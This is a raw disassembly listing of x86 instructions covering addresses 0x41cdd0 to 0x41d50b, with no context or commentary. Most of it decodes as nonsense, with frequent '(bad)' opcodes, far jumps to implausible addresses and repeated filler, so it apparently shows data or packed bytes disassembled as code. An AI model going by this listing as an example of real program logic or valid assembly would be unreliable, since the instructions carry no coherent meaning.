  41cdd0:	lock scas al,BYTE PTR es:[edi]
  41cdd2:	call   0x7da4:0xb77dd6c
  41cdd9:	cmc    
  41cdda:	test   DWORD PTR [ebx-0x34a8e689],0x67ee61a9
  41cde4:	or     ebp,DWORD PTR [ebx-0x3]
  41cde7:	push   eax
  41cde8:	pop    ebp
  41cde9:	mov    eax,ds:0x8c67bd5e
  41cdee:	jmp    0x8a93:0xdb41c1e1
  41cdf5:	mov    esi,DWORD PTR [ebp+0x7b]
  41cdf8:	fnstcw WORD PTR [edx+0xa]
  41cdfb:	retf   
  41cdfc:	ret    
  41cdfd:	cwde   
  41cdfe:	xchg   DWORD PTR [bp-0x1e85],edi
  41ce03:	jmp    0x83cd7948
  41ce08:	xchg   esp,eax
  41ce09:	or     DWORD PTR [ebx-0x19953f0a],eax
  41ce0f:	mov    ebx,0xbc51ffcf
  41ce14:	(bad)  
  41ce15:	dec    BYTE PTR [ecx]
  41ce17:	lock add bl,BYTE PTR ds:0x360a2a9c
  41ce1e:	lock ins DWORD PTR es:[edi],dx
  41ce20:	mov    ebp,0x1b91b54
  41ce25:	mov    ebp,DWORD PTR [ebx+0x2cceb25]
  41ce2b:	xor    dl,BYTE PTR [esi-0x1f3016ae]
  41ce31:	xor    BYTE PTR [edi-0x2e],dl
  41ce34:	sub    DWORD PTR [ecx+ecx*2+0x15],esi
  41ce38:	sub    eax,0xeb5d71b6
  41ce3d:	dec    edx
  41ce3e:	or     eax,0x4fd02070
  41ce43:	dec    ebp
  41ce44:	mov    cl,0x53
  41ce46:	daa    
  41ce47:	mov    ds:0x9aad5aa3,al
  41ce4c:	sub    DWORD PTR [eax-0x24],edx
  41ce4f:	out    dx,al
  41ce50:	das    
  41ce51:	adc    bl,BYTE PTR [edx-0x2c]
  41ce54:	outs   dx,BYTE PTR ds:[esi]
  41ce55:	(bad)  
  41ce56:	adc    ch,BYTE PTR [ecx+0x37]
  41ce59:	mov    al,0x0
	...
  41ce63:	add    BYTE PTR [ecx+0x46],cl
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	push   es
  41ce71:	add    esp,eax
  41ce73:	int    0xbf
  41ce75:	stos   DWORD PTR es:[edi],eax
  41ce76:	add    DWORD PTR [eax],eax
  41ce78:	scas   al,BYTE PTR es:[edi]
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    dh,ah
  41ce7d:	and    cl,BYTE PTR [eax+0x71]
  41ce80:	lock pop eax
  41ce82:	ret    
  41ce83:	xchg   ecx,eax
  41ce84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce85:	outs   dx,BYTE PTR ds:[si]
  41ce87:	xchg   ebx,eax
  41ce88:	lds    ebx,FWORD PTR ds:[edi]
  41ce8b:	cmp    al,0x4
  41ce8d:	outs   dx,BYTE PTR ds:[esi]
  41ce8e:	push   ecx
  41ce8f:	call   0x735c:0x9182c214
  41ce96:	push   eax
  41ce97:	in     eax,0xda
  41ce99:	ret    
  41ce9a:	test   al,0xad
  41ce9c:	push   ecx
  41ce9d:	dec    esi
  41ce9e:	imul   ebx,DWORD PTR [ecx-0x436540eb],0x82e5115f
  41cea8:	sbb    eax,0x2482cdaa
  41cead:	rcl    BYTE PTR [ebx+0x78],0xb3
  41ceb1:	xor    DWORD PTR [ebx],ebx
  41ceb3:	pop    ss
  41ceb4:	aaa    
  41ceb5:	(bad)  
  41ceb6:	retf   
  41ceb7:	inc    edi
  41ceb8:	mov    bl,0xcf
  41ceba:	and    bl,ah
  41cebc:	sub    esi,ebx
  41cebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cebf:	outs   dx,DWORD PTR ds:[esi]
  41cec0:	loope  0x41cf24
  41cec2:	push   ecx
  41cec3:	outs   dx,BYTE PTR ds:[esi]
  41cec4:	call   0x5fe6:0xd201708f
  41cecb:	dec    esi
  41cecc:	sbb    esp,DWORD PTR [ebx-0x24571f54]
  41ced2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ced3:	pushf  
  41ced4:	dec    esp
  41ced5:	cmp    bh,BYTE PTR [ebx+edx*4+0x7868d24]
  41cedc:	adc    BYTE PTR [ebp+edx*8+0x2968ae28],0x8a
  41cee4:	int3   
  41cee5:	mov    ebx,0x2be5ca63
  41ceea:	bound  ecx,QWORD PTR [edx-0x10da8474]
  41cef0:	retf   0xd7bf
  41cef3:	push   ebx
  41cef4:	into   
  41cef5:	sti    
  41cef6:	push   edi
  41cef7:	xchg   ebp,eax
  41cef8:	adc    ebp,DWORD PTR [edi-0x29dc1e94]
  41cefe:	dec    edx
  41ceff:	(bad)  
  41cf00:	fst    QWORD PTR [ebx+0x1a1cf579]
  41cf06:	rol    DWORD PTR ds:0x6b209231,cl
  41cf0c:	cmp    BYTE PTR [edi+0x5677b062],dh
  41cf12:	jb     0x41cf66
  41cf14:	add    edi,DWORD PTR [esi+0x18]
  41cf17:	mov    eax,DWORD PTR [edx-0x4c29c2f1]
  41cf1d:	xchg   ebx,eax
  41cf1e:	(bad)  
  41cf1f:	cmp    eax,0xde6215e4
  41cf24:	es mov bh,0x4b
  41cf27:	out    dx,eax
  41cf28:	adc    bl,BYTE PTR [ecx]
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	addr16 (bad) 
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0x98b6da72
  41cf42:	mul    BYTE PTR [edi]
  41cf44:	ins    DWORD PTR es:[edi],dx
  41cf45:	lods   al,BYTE PTR ds:[esi]
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	scas   al,BYTE PTR es:[edi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [ecx-0x2f5ea2d9],dl
  41cf51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf52:	cmp    eax,DWORD PTR [ebx-0x6cde5390]
  41cf58:	xor    DWORD PTR [esi-0x45],esp
  41cf5b:	arpl   WORD PTR [ebx+0x7925f77a],ax
  41cf61:	sbb    eax,0x37f1a2d7
  41cf66:	mov    esi,0x2b6eeeaa
  41cf6b:	sub    DWORD PTR [edi+0xd],esi
  41cf6e:	repz push ebx
  41cf70:	shl    BYTE PTR [esi-0xdcc82ad],1
  41cf76:	(bad)  
  41cf77:	jmp    0x41cfae
  41cf79:	jmp    0xd341:0x4b558316
  41cf80:	lock mov edx,0xd8d2ca02
  41cf86:	shr    DWORD PTR [esi+0x4f],cl
  41cf89:	imul   ebp,DWORD PTR [eax],0xa3f5f720
  41cf8f:	dec    esi
  41cf90:	daa    
  41cf91:	mov    ecx,0xf09c8be8
  41cf96:	inc    ch
  41cf98:	cs pop ss
  41cf9a:	adc    BYTE PTR [edx+0x2574a277],bh
  41cfa0:	xor    al,0x67
  41cfa2:	(bad)  
  41cfa3:	bound  eax,QWORD PTR [ebx+edi*4+0x1c]
  41cfa7:	mov    DWORD PTR [eiz*4-0x2d3159c9],0xab5dc00f
  41cfb2:	call   0x4923efec
  41cfb7:	out    0x4d,al
  41cfb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfba:	adc    esi,DWORD PTR [edi-0xa]
  41cfbd:	xor    ch,dh
  41cfbf:	jmp    0x237188ef
  41cfc4:	enter  0x3321,0xc1
  41cfc8:	call   0x1ae1:0x1c91e
  41cfcf:	fisttp DWORD PTR [ebx]
  41cfd1:	dec    ebp
  41cfd2:	addr16 popa 
  41cfd4:	sti    
  41cfd5:	jg     0x41d026
  41cfd7:	inc    esp
  41cfd8:	ins    DWORD PTR es:[edi],dx
  41cfd9:	dec    ebp
  41cfda:	mov    al,0x89
  41cfdc:	call   0x1b48:0x741337b7
  41cfe3:	retf   
  41cfe4:	xor    eax,0x1d75b3e9
  41cfe9:	(bad)  
  41cfea:	push   ecx
  41cfeb:	lods   al,BYTE PTR ds:[esi]
  41cfec:	xchg   ecx,eax
  41cfed:	call   0xa21e2c94
  41cff2:	sub    DWORD PTR [eax+0x61],esp
  41cff5:	sbb    BYTE PTR [edx-0x72],al
  41cff8:	pushf  
  41cff9:	mov    al,ds:0x0
  41cffe:	add    BYTE PTR [eax],al
  41d000:	add    BYTE PTR [eax],al
  41d002:	add    BYTE PTR [eax],al
  41d004:	ret    
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0x10cecd47,eax
  41d013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d014:	sbb    ebp,DWORD PTR [ebp+0xae0001]
  41d01a:	add    BYTE PTR [eax],al
  41d01c:	pop    esp
  41d01d:	adc    al,0x92
  41d01f:	bnd jle 0x41d081
  41d022:	addr16 icebp 
  41d024:	and    al,0x12
  41d026:	jnp    0x41d04d
  41d028:	and    eax,0x4404b510
  41d02d:	sbb    BYTE PTR [esi+0x3f28715f],bh
  41d033:	test   BYTE PTR [esi],al
  41d035:	aam    0x8e
  41d037:	inc    ebp
  41d038:	std    
  41d039:	xchg   edi,eax
  41d03a:	pop    ss
  41d03b:	and    eax,0xc4d33688
  41d040:	cmc    
  41d041:	out    0xcb,eax
  41d043:	retf   0xf642
  41d046:	ficom  WORD PTR [edx+0x6d]
  41d049:	push   cs
  41d04a:	xchg   BYTE PTR [edx],bh
  41d04c:	jle    0x41d047
  41d04e:	pop    ds
  41d04f:	xlat   BYTE PTR ds:[ebx]
  41d050:	adc    edx,DWORD PTR [esi+0x4f]
  41d053:	fisttp WORD PTR ds:0x4f858d9
  41d059:	mov    ch,0x17
  41d05b:	push   es
  41d05c:	adc    eax,0xb3a319f0
  41d061:	jo     0x41d08c
  41d063:	lds    ebp,FWORD PTR [ebx-0x47a35b2a]
  41d069:	or     esp,eax
  41d06b:	daa    
  41d06c:	jl     0x41d03b
  41d06e:	sahf   
  41d06f:	xchg   BYTE PTR [edi-0x4b],ch
  41d072:	gs (bad) 
  41d074:	mov    WORD PTR [ebx],cs
  41d076:	(bad)  
  41d077:	xor    ecx,DWORD PTR [ebx+0x4d]
  41d07a:	aas    
  41d07b:	sub    DWORD PTR [ecx-0x54],ebp
  41d07e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d07f:	gs push ss
  41d081:	jae    0x41d0cf
  41d083:	stos   BYTE PTR es:[edi],al
  41d084:	jnp    0x41d01e
  41d086:	sub    eax,0x9c5ed74a
  41d08b:	sar    BYTE PTR [edx-0x35],0xf0
  41d08f:	imul   DWORD PTR [ecx+0x72]
  41d092:	ins    DWORD PTR es:[edi],dx
  41d093:	addr16 out dx,eax
  41d095:	or     dh,BYTE PTR [esi+0x67]
  41d098:	dec    edx
  41d099:	inc    ebp
  41d09a:	ror    al,cl
  41d09c:	push   0xd63a008b
  41d0a1:	inc    edx
  41d0a2:	lods   eax,DWORD PTR ds:[esi]
  41d0a3:	test   edi,eax
  41d0a5:	mov    eax,ss:0xb4246de8
  41d0ab:	pop    es
  41d0ac:	fmul   st(6),st
  41d0ae:	nop
  41d0af:	mov    ah,0xdc
  41d0b1:	out    0x2f,eax
  41d0b3:	(bad)  [ebp-0x49]
  41d0b6:	(bad)  
  41d0b7:	int3   
  41d0b8:	mov    ch,0xa9
  41d0ba:	ins    DWORD PTR es:[edi],dx
  41d0bb:	pop    es
  41d0bc:	rol    dh,0x1
  41d0bf:	pop    ebp
  41d0c1:	scas   eax,DWORD PTR es:[edi]
  41d0c2:	sub    DWORD PTR [ecx+0x5ab58711],edx
  41d0c8:	(bad)  
  41d0c9:	nop
	...
  41d0d2:	add    BYTE PTR [eax],al
  41d0d4:	fld    st(2)
  41d0d6:	add    eax,0xddcf1f49
  41d0db:	ror    al,cl
  41d0dd:	outs   dx,DWORD PTR ds:[esi]
  41d0de:	clc    
  41d0df:	shl    BYTE PTR [eax],cl
  41d0e1:	(bad)  
  41d0e2:	ftst   
  41d0e4:	leave  
  41d0e5:	lods   eax,DWORD PTR ds:[esi]
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	scas   al,BYTE PTR es:[edi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [ebx+0x37bc0f95],ah
  41d0f1:	aas    
  41d0f2:	aas    
  41d0f3:	jmp    0x7dd8:0x98421999
  41d0fa:	jge    0x41d111
  41d0fc:	inc    esp
  41d0fd:	sub    DWORD PTR [edx],edi
  41d0ff:	aaa    
  41d100:	int3   
  41d101:	inc    ecx
  41d102:	(bad)  
  41d103:	fldcw  WORD PTR [edi]
  41d105:	out    dx,eax
  41d106:	arpl   bx,cx
  41d108:	cld    
  41d109:	dec    ebp
  41d10a:	inc    eax
  41d10b:	(bad)  
  41d10c:	pop    ecx
  41d10d:	xchg   edi,eax
  41d10e:	mov    cl,0x14
  41d110:	ds dec ebx
  41d112:	leave  
  41d113:	dec    ebx
  41d114:	or     DWORD PTR [ebp+0x11],0xffffffe0
  41d118:	leave  
  41d119:	inc    ebx
  41d11a:	jmp    0xaada:0xd7a3f3ac
  41d121:	mov    esp,0xb657abd3
  41d126:	xor    eax,DWORD PTR [ebp+0x7770b910]
  41d12c:	js     0x41d145
  41d12e:	dec    esp
  41d12f:	or     esi,ebx
  41d131:	ss (bad) 
  41d133:	jmp    0xc83de733
  41d138:	ret    0x4081
  41d13b:	aam    0x4c
  41d13d:	inc    ebx
  41d13e:	xchg   ecx,eax
  41d13f:	add    al,0x2
  41d141:	aad    0xf6
  41d143:	xchg   esi,eax
  41d144:	mov    eax,ds:0x1ad36776
  41d149:	(bad)  
  41d14a:	enter  0x7c19,0xcc
  41d14e:	nop
  41d14f:	data16 clc 
  41d151:	out    dx,eax
  41d152:	mov    ebx,0xbab7d604
  41d157:	into   
  41d158:	out    dx,eax
  41d159:	xlat   BYTE PTR ds:[ebx]
  41d15a:	sbb    bl,dh
  41d15c:	les    edi,FWORD PTR [eax-0x2b]
  41d15f:	into   
  41d160:	add    edx,DWORD PTR [eax]
  41d162:	in     al,0x2a
  41d164:	push   ebp
  41d165:	stc    
  41d166:	outs   dx,BYTE PTR ds:[esi]
  41d167:	ret    0x1dee
  41d16a:	ja     0x41d1b4
  41d16c:	dec    edx
  41d16d:	or     eax,0x6705c258
  41d172:	cs pop ebx
  41d174:	sahf   
  41d175:	jmp    0x9d6688ea
  41d17a:	ss gs (bad) 
  41d17d:	shl    DWORD PTR [eax+0x47],1
  41d180:	dec    esi
  41d181:	hlt    
  41d182:	loopne 0x41d168
  41d184:	(bad)  
  41d185:	sub    al,0x81
  41d187:	lds    edi,FWORD PTR [esi-0x4103f316]
  41d18d:	ret    0xf863
  41d190:	rcr    BYTE PTR [esi],cl
  41d192:	pop    edx
  41d193:	mov    esp,eax
  41d195:	pop    esi
  41d196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d197:	pop    eax
  41d198:	dec    ecx
  41d199:	repnz add BYTE PTR [eax],al
	...
  41d1a4:	popa   
  41d1a5:	pop    edi
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	sbb    DWORD PTR [esi],esp
  41d1b2:	ins    DWORD PTR es:[edi],dx
  41d1b3:	les    esi,FWORD PTR [edi-0x52]
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	adc    eax,0xa4000000
  41d1bd:	cli    
  41d1be:	and    al,BYTE PTR [ecx+0x4dc4ca4e]
  41d1c4:	icebp  
  41d1c5:	push   ds
  41d1c6:	in     eax,0x64
  41d1c8:	loop   0x41d19d
  41d1ca:	inc    esi
  41d1cb:	inc    ebp
  41d1cc:	adc    ebx,DWORD PTR [edi-0x4a]
  41d1cf:	out    dx,al
  41d1d0:	or     al,0x0
  41d1d2:	add    BYTE PTR [eax],al
  41d1d4:	add    BYTE PTR [eax+0x42],ah
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
